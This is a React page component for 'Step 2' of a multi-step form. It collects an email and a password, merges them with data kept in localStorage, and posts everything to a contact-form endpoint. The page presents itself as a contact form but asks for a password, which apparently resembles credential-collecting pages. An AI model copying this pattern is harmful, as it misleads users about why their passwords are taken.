import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { confirmationFormSchema } from "@/lib/form-schemas";
import { apiRequest } from "@/lib/queryClient";

export default function Confirmation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();

  const form = useForm({
    resolver: zodResolver(confirmationFormSchema),
    defaultValues: {
      user_email: "",
      password: "",
    },
  });

  const onSubmit = async (data: any) => {
    try {
      const validationData = JSON.parse(localStorage.getItem('validation_data') || '{}');
      const formData = { ...validationData, ...data };

      await apiRequest('POST', '/api/contact-form', formData);

      localStorage.removeItem('validation_data');
      toast({
        title: "Success!",
        description: "Your contact form has been submitted successfully"
      });
      setLocation("/success");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <>
      <MetaTags 
        title="Contact Form | Step 2"
        description="Contact form confirmation step"
      />
      <div className="min-h-screen bg-background flex justify-center items-center p-4">
        <div className="max-w-md w-full space-y-6">
          <div className="text-center">
            <h1 className="text-2xl font-bold text-primary">Step 2: Contact Details</h1>
            <p className="text-muted-foreground mt-2">
              Please provide your contact information
            </p>
          </div>

          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <FormField
                control={form.control}
                name="user_email"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Email Address</FormLabel>
                    <FormControl>
                      <Input
                        type="email"
                        placeholder="Enter your email address"
                        className="w-full"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <FormField
                control={form.control}
                name="password"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel>Password</FormLabel>
                    <FormControl>
                      <Input
                        type="password"
                        placeholder="Create a password"
                        className="w-full"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <Button 
                type="submit" 
                className="w-full"
                disabled={form.formState.isSubmitting}
              >
                {form.formState.isSubmitting ? "Submitting..." : "Submit Form"}
              </Button>
            </form>
          </Form>
        </div>
      </div>
    </>
  );
}